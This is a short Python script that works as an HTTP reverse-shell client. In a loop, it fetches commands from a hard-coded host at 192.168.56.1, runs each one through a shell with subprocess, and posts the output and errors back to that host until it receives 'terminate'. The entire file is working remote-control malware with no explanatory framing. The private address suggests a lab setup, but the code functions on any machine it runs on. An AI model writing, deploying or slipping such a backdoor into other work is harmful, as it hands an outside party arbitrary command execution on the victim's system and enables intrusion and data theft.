import subprocess
import time
import requests
import os

URL = 'http://192.168.56.1'

while True:
    request = requests.get(URL)
    cmd = request.text

    if 'terminate' in cmd:
        break

    else:
        cmdPrompt = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

        post_response = requests.post(url=URL, data=cmdPrompt.stdout.read() ) # POST the result 
        post_response = requests.post(url=URL, data=cmdPrompt.stderr.read() ) # or the error if there's any.

        time.sleep(3)
        
    
        
